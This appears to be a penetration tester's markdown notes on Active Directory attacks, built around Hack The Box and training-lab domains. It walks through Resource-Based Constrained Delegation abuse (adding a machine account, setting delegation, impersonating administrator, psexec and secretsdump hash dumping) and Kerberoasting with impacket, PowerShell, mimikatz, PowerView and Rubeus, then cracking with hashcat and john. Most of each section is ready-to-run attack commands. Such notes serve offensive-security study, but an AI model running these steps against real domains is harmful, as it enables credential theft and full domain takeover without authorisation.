------------

### AD attacks-:

------------

### Abuse Resource-Based Constrained Delegation to Gain Unauthorized Access

--------------

- In Resource-Based Constrained Delegation (RBCD), we configure the target resource e.g. a database or file server to specify which service accounts are permitted to access it on behalf of users. For example, a database service can be set up to allow specific services, like a web service, to act on behalf of users through assigned security permissions.
- This differs from unconstrained and constrained delegation. With unconstrained delegation, service accounts with delegation enabled can access any resource on behalf of users. Similarly, with constrained delegation, service accounts with delegation enabled can access a specific list of resources.
- Requirement-:

```
BCD is configured by setting the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
This attribute specifies which service accounts or systems are permitted to act on behalf of users to access the target resource.
-To exploit this type of delegation, an attacker must gain access to an account with Write permissions on the targeted resource (computer object), such as GenericAll, GenericWrite, and WriteDACL.
```

- User `SUPPORT@SUPPORT.HTB` which the user I owned before is a member of a group called `SHARED SUPPORT ACCOUNTS@SUPPORT.HTB`. The group itself have full control to a computer called DC.SUPPORT.HTB, so in other words user SUPPORT have full control to DC.SUPPORT.HTB including write permission.
  
![image](https://github.com/user-attachments/assets/4b44f38a-49c4-45fb-b68f-ddf8a3f1442b)

- Exploiting with rbcd tool
- Impacket tool `[AddCOmputer]`Syntax to add a computer-:

```bash
addcomputer.py -computer-name 'password' -computer-pass 'password' -dc-ip [ip] '[domain]/[username]:[password]'
```

![image](https://github.com/user-attachments/assets/bc19a1ba-5325-444a-9a0d-803f1128bcf9)

- Then, we use the RBCD python script to add our new computer to the msds-allowedtoactonbehalfofotheridentity attribute list.[RBCD tool](https://github.com/AlteredSecurity/RBCD.git)

![image](https://github.com/user-attachments/assets/e916c933-d028-4a30-9580-1de27fdd9790)

- Syntax-:

```
python3 rbcd.py 10.10.11.174 -u [domain]\\[user] -p '[password]' -t DC -f [newly created computer]
```
![image](https://github.com/user-attachments/assets/4d39f81b-92fa-4ae4-9e0a-f6b6ab2757d9)

- Now, we have what it needs to request a service ticket; we will use the getST.py script from impacket instead of Rubeus to request the service ticket as administrator.

```bash
python3 getST.py -spn cifs/[object with unconstrained delegation over] -impersonate [user] -dc-ip [ip] '[domain]/[user]:[password]'
```

![image](https://github.com/user-attachments/assets/253b6ac4-0518-46c5-afc0-bdf8f9d90c10)

![image](https://github.com/user-attachments/assets/a4cb3279-56f8-4360-b567-7a5336a1a96c)

- When the ticket is issued, we can use by setting it to variable `KRB5CCNAME` for `impacket-psexec`.

Syntax-:

```bash
KRB5CCNAME=[ccache file name [endswith .ccache] impacket-psexec [domain]/[user]@[object] -k -no-pass
```

![image](https://github.com/user-attachments/assets/68bf410e-228d-4ade-9698-4afec915d1fb)

- Dumping the hashes with impacket-secretsdump-:
 - You can set the `KRB5CCNAME` as an environmental variable
   ```bash
   export KRB5CCNAME=$(pwd)/administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
   ```
  
- Syntax-:

```bash
impacket-secretsdump -k -target-ip [ip] [domain name]
```
![image](https://github.com/user-attachments/assets/bed765e7-218d-4e65-9afc-e0f156620534)

- Pass the hash with Evil-winrm -:

![image](https://github.com/user-attachments/assets/0f8af80b-c32a-4782-a63d-0f76e1e93cf7)

------------------------

### Reference

-----------------------

- [Unconstrained Resource Delegation](https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a)

---------------------

### Kerbroasting

---------------------

- Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts.They are unique identifiers that uses Kerberos to map a service instance to a service account in which context the service is running.Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
- Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

--------------

### Steps(Kerberoasting with GetUserSPNs.py)

--------------

- Script-:

<img width="1908" height="563" alt="image" src="https://github.com/user-attachments/assets/efb28544-eabc-4517-8c5c-0d85e0f0bbf5" />

- We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password.
- Syntax-:

```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

<img width="1905" height="749" alt="image" src="https://github.com/user-attachments/assets/a403fa2a-8463-4744-9a3a-d326329e8314" />

- Requesting a Single TGS ticket

```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

<img width="1899" height="561" alt="image" src="https://github.com/user-attachments/assets/447270aa-9cb7-445e-b04b-c487c8f842de" />

- The next step is to crack with `hashcat`.

```bash
hashcat -m 13100 kerberoasted_sqldev /usr/share/wordlists/rockyou.txt
```
- Saving to an ouptut file

```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile kerberoasted_sqldev
```

<img width="1905" height="396" alt="image" src="https://github.com/user-attachments/assets/4e9d65fa-7ae5-4cad-b251-35d16c8381d9" />

- Cracked with John-:

<img width="1100" height="259" alt="image" src="https://github.com/user-attachments/assets/edbab145-08c4-4002-b96a-64a509575a2f" />

- Requesting all users

```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

<img width="1894" height="977" alt="image" src="https://github.com/user-attachments/assets/2447936a-0e4d-4603-b3a2-7be2e6957913" />

--------------

### Using Windows for kerberoasting( Semi Manual mode)

--------------

- Using [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary

```powershell
setspn -Q */*
```
<img width="912" height="691" alt="image" src="https://github.com/user-attachments/assets/cda09d4f-73a1-428c-8ead-c8033eb85d6c" />

- We will focus on user accounts and ignore the computer accounts returned by the tool. Using powershell to target a single user-:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- Retrieving all tickets with `setspn.exe`

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

- Now that they are loaded, retrieve with mimikatz

<img width="768" height="220" alt="image" src="https://github.com/user-attachments/assets/3ed518dd-7e6a-4782-bd5c-a092f58595c4" />

- Commands-:

```mimikatz
base64 /out::true
kerberos::list /export
```

<img width="1012" height="544" alt="image" src="https://github.com/user-attachments/assets/0148115c-b4a8-4686-883f-88ef57d7c849" />

-----------

### Prepping it for cracking

------------

- If base64 encoded, decode first it base64
- Then, convert to tickets with `kirbi2john`

<img width="1897" height="865" alt="image" src="https://github.com/user-attachments/assets/2673e520-5ad1-4e24-a2b7-4699bf6e2c20" />

- Crack with `john`

<img width="1317" height="274" alt="image" src="https://github.com/user-attachments/assets/0f587cd6-f7d0-45c9-b550-408d3dfe83e3" />

- Modifying for hashcat

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' tickets.txt
```

- Using [Powerview](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to capture the tickets

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

<img width="837" height="294" alt="image" src="https://github.com/user-attachments/assets/5af90cd3-e960-4e1f-9af9-af7529ec1d48" />

- Targeting a specific user

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
<img width="1199" height="621" alt="image" src="https://github.com/user-attachments/assets/f5332108-49e6-4f18-bf2f-5080cdce7843" />

- Exporting to csv format-:

```powershell
Get-DomainUser * -spn | Get-DomainSPNTicket -Format Hashcat | Export-csv .\powershell.csv -NoTypeInformation
```

<img width="1202" height="288" alt="image" src="https://github.com/user-attachments/assets/0097d3c9-2c34-4355-bc2d-12545fcc27bc" />

-------------

### Using Rubeus

---------------

- [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
- Getting all the stats and info

```powershell
.\Rubeus.exe kerberoast /stats
```

<img width="1200" height="604" alt="image" src="https://github.com/user-attachments/assets/a09d9852-c885-485f-8ae2-5658d4dfbd43" />

- Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.Using the `/nowrap` flag

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

<img width="1198" height="682" alt="image" src="https://github.com/user-attachments/assets/477b0038-c4f1-450e-bc60-0475d76c3cac" />


---------------

### Other Encryption Types

---------------

- Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
- Requesting a ticket for user `testspn`

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

- Checking supported hash type with `Powerview`, `msds-supportedencryptiontypes` is set to `AES 128/256`

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
<img width="1196" height="112" alt="image" src="https://github.com/user-attachments/assets/aac9ff57-1313-46b0-be41-d4ba7f52fe24" />

- Use `/tgtdeleg` to request for only RC4 encryption hash (type 23)-:

```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```

<img width="1222" height="700" alt="image" src="https://github.com/user-attachments/assets/d3f19e6b-cd11-46f6-b6ff-d9af3b434328" />

- 




---------------




